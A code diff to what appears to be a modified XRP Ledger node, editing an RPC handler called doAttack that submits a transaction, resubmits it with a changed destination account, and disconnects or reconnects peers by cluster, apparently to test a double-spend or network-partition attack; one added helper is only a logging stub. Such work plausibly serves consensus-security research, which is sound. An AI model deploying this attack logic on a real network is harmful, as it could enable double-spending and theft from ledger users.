@@ -17,6 +17,9 @@
 */
 //==============================================================================
 
+#include <chrono>
+#include <thread>
+
 #include <ripple/app/ledger/LedgerMaster.h>
 #include <ripple/app/misc/HashRouter.h>
 #include <ripple/app/misc/Transaction.h>
@@ -172,8 +175,7 @@ Json::Value doSubmit (RPC::Context& context)
 Json::Value doAttack (RPC::Context& context)
 {
     auto j = context.app.journal ("Attack");
-    const char *x = "10.5.1.1";
-    JLOG (j.warn()) << "Starting doAttack" << strcmp("10.5.1.1", x);
+    JLOG (j.warn()) << "Starting doAttack";
     changePeers(context, 0, j);
 
     context.loadType = Resource::feeMediumBurdenRPC;
@@ -199,6 +201,10 @@ Json::Value doAttack (RPC::Context& context)
             context.params, failType, context.role,
             context.ledgerMaster.getValidatedLedgerAge(),
             context.app, RPC::getProcessTxnFnAttack (context.netOps));
+
+        std::this_thread::sleep_for(std::chrono::milliseconds(200));
+
+        sendQueuedTransactions(context, j);
         
         tx[jss::Destination] = "rnkP5Tipm14sqpoDetQxrLjiyyKhk72eAi";
         context.params[jss::tx_json] = tx;
@@ -209,6 +215,10 @@ Json::Value doAttack (RPC::Context& context)
             context.params, failType, context.role,
             context.ledgerMaster.getValidatedLedgerAge(),
             context.app, RPC::getProcessTxnFnAttack (context.netOps));
+        
+        std::this_thread::sleep_for(std::chrono::milliseconds(200));
+
+        sendQueuedTransactions(context, j);
 
         ret[jss::deprecated] = "Signing support in the 'submit' command has been "
                                "deprecated and will be removed in a future version "
@@ -217,6 +227,7 @@ Json::Value doAttack (RPC::Context& context)
         changePeers(context, -1, j);
         return ret;
     }
+    JLOG (j.warn()) << "doAttack: checkpoint 1";
 
     Json::Value jvResult;
 
@@ -314,28 +325,40 @@ Json::Value doAttack (RPC::Context& context)
     }
 }
 
+void sendQueuedTransactions(RPC::Context& context, beast::Journal j) {
+    // TODO: implement this function
+    // For now: just print all peers we are connected to:
+    auto peers = context.app.overlay ().getActivePeers();
+    for (auto& peer : peers) {
+        auto peer_endpoint = peer->getRemoteAddress();
+        std::string addressString = peer_endpoint.address().to_string();
+        JLOG (j.warn()) << "sendQueuedTransactions: connected to " << addressString;
+    }
+    return;
+}
+
+
 void changePeers (RPC::Context& context, int cluster_idx, beast::Journal j)
 {
-    JLOG (j.warn()) << "changePeers: start (connected to " << context.app.overlay ().size() << " nodes)";
+    JLOG (j.warn()) << "changePeers: start (cluster_idx: " << cluster_idx << ")";
     
     // Iter over all peers and either connect or disconnect from peers
-    const static auto peers = context.app.overlay ().getActivePeers();
+    const auto peers = context.app.overlay ().getActivePeers();
     for (auto& peer : peers) {
         if (peer) {
             auto peer_endpoint = peer->getRemoteAddress();
             std::string addressString = peer_endpoint.address().to_string();
 
             if (shouldConnectPeer(addressString, cluster_idx)) {
-                JLOG (j.warn()) << "changePeers: connect to " << addressString << " (cluster_idx " << cluster_idx << ")";
+                JLOG (j.warn()) << "changePeers: connect    to   " << addressString;
                 context.app.overlay ().connect(peer_endpoint);
             } else {
-                JLOG (j.warn()) << "changePeers: disconnect from " << addressString << " (cluster_idx " << cluster_idx << ")";
+                JLOG (j.warn()) << "changePeers: disconnect from " << addressString;
                 auto peerImp = std::dynamic_pointer_cast<PeerImp>(peer);
                 peerImp->close();
             }
         }
     }
-    JLOG (j.warn()) << "changePeers: end (connected to " << context.app.overlay ().size() << " nodes)";
 }
 
 bool shouldConnectPeer(std::string peer_address, int cluster_idx) {
